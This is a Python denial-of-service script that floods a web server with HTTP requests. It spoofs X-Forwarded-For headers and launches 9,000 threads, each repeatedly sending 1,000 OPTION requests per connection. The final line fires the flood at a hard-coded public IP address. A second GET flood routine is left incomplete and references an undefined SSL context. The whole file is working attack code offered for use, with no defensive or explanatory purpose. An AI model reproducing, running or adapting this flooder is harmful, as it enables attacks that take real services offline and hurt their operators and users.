from random import randrange
from socket import AF_INET, SOCK_STREAM, socket, IPPROTO_TCP, TCP_NODELAY
import ssl
from threading import Thread
import threading
from time import sleep, time


def spoofer():
    return ".".join(str(randrange(1,190)) for i in range(4))


def Headers(t):
    connection = "Connection: keep-alive\r\n"
    accept = "Accept: */*" + "\r\n"
    connection += "Cache-Control: max-age=0\r\n"
    connection += "pragma: no-cache\r\n"
    connection += "X-Forwarded-For: " + spoofer() + "\r\n"
    referer = "Referer: null\r\n"
    useragent = "User-Agent: null\r\n"
    header = referer + useragent + accept + connection + "\r\n\r\n"
    return header


# ctx = ssl.SSLContext()

def GET(dom, path, port):
    payload = \
        f"GET {path} HTTP/1.1\r\n" +\
        f"Host: {dom}\r\n" +\
        Headers("get")
    # print(payload)

    def send_packet():
        while True:
            # try:
            ___ = time()
            s = socket(AF_INET, SOCK_STREAM)
            # s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.connect((dom, port))
            # s.setsockopt(IPPROTO_TCP,TCP_NODELAY, 1)

            s = ctx.wrap_socket(s, server_hostname=dom)
            print(time()-___)
            # try:
            for _ in range(1000):
                s.send(str.encode(payload))


            #     except:s.close()
            # except:s.close()
r = 0


def DSTAT(dom, port=80, path="/"):
    global r
    print("Attack started")
    head_host = "OPTION " + path + " HTTP/1.1\r\nHost: " + dom + "\r\n"
    request = (head_host + Headers(5)).encode()

    def send_packet(event,g=0):
        event.wait()
        try:
            s = socket(AF_INET, SOCK_STREAM)
            s.connect((dom, port))
            s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        except:
            send_packet(event,1)
        # sleep(10)
        # print("sdddddddddddddddddddddddddd")
        try:
            for _ in range(1000):
                s.sendall(request)
        except:
            pass
        send_packet(event,1)

    g = threading.Event()
    for i in range(9000):
        print(f"Thread {str(i)} started !")
        Thread(target=lambda: send_packet(g)).start()
    print("started")
    # input("[ENTER]: ")
    g.clear()
    g.set()


DSTAT("8.28.7.208", port=80)
